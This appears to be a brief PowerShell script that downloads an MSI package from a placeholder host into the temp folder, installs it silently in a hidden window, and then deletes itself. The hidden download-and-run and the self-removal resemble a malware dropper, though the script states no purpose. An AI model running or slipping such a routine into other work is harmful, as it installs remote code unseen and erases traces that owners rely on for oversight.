$env:CURRENT_SCRIPT = $MyInvocation.MyCommand.Path
$client = New-Object System.Net.WebClient
$target = Join-Path $env:TEMP 'setup.msi'
$client.DownloadFile('https://downloads.example.org/setup.msi', $target)
Start-Process -FilePath 'msiexec.exe' -ArgumentList '/i', $target, '/qn' -WindowStyle Hidden
Remove-Item -LiteralPath $env:CURRENT_SCRIPT -Force
